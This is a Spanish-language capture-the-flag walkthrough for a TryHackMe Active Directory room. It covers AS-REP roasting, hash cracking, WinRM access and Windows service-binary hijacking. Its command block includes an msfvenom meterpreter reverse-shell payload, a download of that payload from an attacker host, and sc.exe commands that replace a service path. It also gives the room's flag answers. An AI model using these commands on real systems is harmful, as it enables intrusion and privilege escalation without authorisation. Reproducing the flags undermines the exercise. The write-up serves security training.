# Services

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Active Directory (Windows) | services | https://tryhackme.com/room/services | 02 Level Medium | TryHackMe | Active Directory, Kerberos, ASREPRoast (GetNPUsers.py + hashcat -m 18200), Evil-WinRM, enumeración de servicios Windows (sc.exe), hijack de binario de servicio (msfvenom service exe), escalada de privilegios Windows | Compromiso total del dominio/host: foothold vía AS-REP Roasting (WinRM) y escalada a administrator reemplazando el binario de un servicio que se ejecuta en contexto de sistema/administrador |

---

**Contexto:** La sala **Services** es un CTF de **Active Directory** en una máquina Windows (dominio `services.local`). El punto de entrada es un ataque **ASREPRoast**: enumerar usuarios del dominio y detectar cuál tiene `DONT_REQUIRE_PREAUTH`, solicitar un ticket AS-REP con `GetNPUsers.py` (Impacket) y **crackear el hash offline** con `hashcat -m 18200` contra `rockyou.txt`. Con la contraseña recuperada, el usuario (miembro de "Remote Management Users") entra por **Evil-WinRM** (5985). Dentro del host se enumeran los **servicios de Windows**: varios binarios de servicios que corren en contexto de sistema/Administrador son modificables por el usuario. Se reemplaza la ruta de uno de ellos (p. ej. `AWSLiteAgent`) apuntando a un ejecutable malicioso (`msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe-service`), se reinicia el servicio y se obtiene una sesión **Meterpreter como SYSTEM/Administrator**, suficiente para leer ambas flags (usuario y administrador).

## Solucionario

### Task 1: ASREPRoast, Evil-WinRM y hijack de servicio / ASREPRoast, Evil-WinRM and service hijacking
**Explicación:** Con un listado de usuarios del dominio se ejecuta `GetNPUsers.py` contra el DC: todos excepto `j.rock` tienen `UF_DONT_REQUIRE_PREAUTH`; el hash AS-REP de `j.rock@SERVICES.LOCAL` se guarda en formato hashcat y se crackea con `-m 18200`. `j.rock` es miembro de "Remote Management Users", de modo que se entra con **Evil-WinRM**. Enumeration de servicios muestra varios binarios con privilegios `True` (ejecutan en contexto de sistema) sobre los que el usuario tiene permisos de escritura. Se genera un payload de servicio con `msfvenom`, se sube al host, se cambia la `binPath` del servicio (p. ej. `AWSLiteAgent`) con `sc.exe config`, se detiene y arranca el servicio y el handler de Metasploit recibe la sesión Meterpreter con privilegios de administrador. Con esa sesión se leen las flags de usuario y, tras escalar a administrador, la flag final.

```bash
# 1) ASREPRoast: obtener el hash del usuario sin pre-autenticación
GetNPUsers.py -dc-ip 10.10.x.x services.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
# -> $krb5asrep$23$j.rock@SERVICES.LOCAL:<HASH>

# 2) Cracking offline
hashcat -m 18200 hashes.txt rockyou.txt -a 0 --force

# 3) Foothold con WinRM
evil-winrm -i 10.10.x.x -u j.rock -p '<password>'
services          # enumerar servicios (privilegios True = sistema)

# 4) Payload para el servicio
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=9001 -f exe-service -o rev9001.exe
iwr -Uri http://<IP>:8080/rev9001.exe -OutFile rev9001.exe

# 5) Hijack del binario del servicio y disparo
sc.exe config AWSLiteAgent binPath= "C:\Users\j.rock\Documents\rev9001.exe"
sc.exe stop AWSLiteAgent
sc.exe start AWSLiteAgent
# msfconsole multi/handler (windows/x64/meterpreter/reverse_tcp) -> sesión SYSTEM/Administrator
```

| # | Pregunta / Question | Respuesta / Answer |
|---|--------------------|--------------------|
| 1 | What is the user flag? | `THM{ASr3p_R0aSt1n6}` |
| 2 | What is the administrator/root flag? | `THM{S3rv3r_0p3rat0rS}` |

### Tabla unificada / Unified table

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? | `THM{ASr3p_R0aSt1n6}` |
| 2 | What is the administrator/root flag? | `THM{S3rv3r_0p3rat0rS}` |

---

**Metodología:** Enumeración del dominio (usuarios) → ataque **ASREPRoast** (GetNPUsers.py) → cracking del AS-REP hash (`hashcat -m 18200`) → acceso por WinRM (grupo Remote Management Users) → enumeración de servicios de Windows con información de privilegios → detección de binarios modificables en contexto de sistema → generación y subida de un `exe-service` con `msfvenom` → cambio de `binPath` con `sc.exe` → reinicio del servicio → sesión de administrador → captura de flags.

**Learning chain:** Reconocimiento de AD (puertos Kerberos/LDAP/WinRM) → ASREPRoast → cracking de hash Kerberos → lateral/initial access por WinRM → enumeración de servicios y ACLs de binarios → service binary hijacking → ejecución como SYSTEM → flags.

**Lección:** *Un usuario sin pre-autenticación Kerberos entrega su hash para cracking offline (ASREPRoast), y en Windows, un binario de servicio escribible que corre como sistema convierte cualquier payload en una escalada directa a administrador.*

**MITRE ATT&CK:** T1558.004 Steal or Forge Kerberos Tickets (AS-REP Roasting) · T1078 Valid Accounts (WinRM) · T1110.002 Password Cracking · T1021.006 Remote Services (WinRM) · T1543.003 Create or Modify System Process (Windows Service) · T1574.001 Hijack Execution Flow (DLL/Service Binary Hijacking) · T1068 Exploitation for Privilege Escalation · T1003/lectura de flags (Data from Local System).

**Fuente:** [TryHackMe - Services](https://tryhackme.com/room/services)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.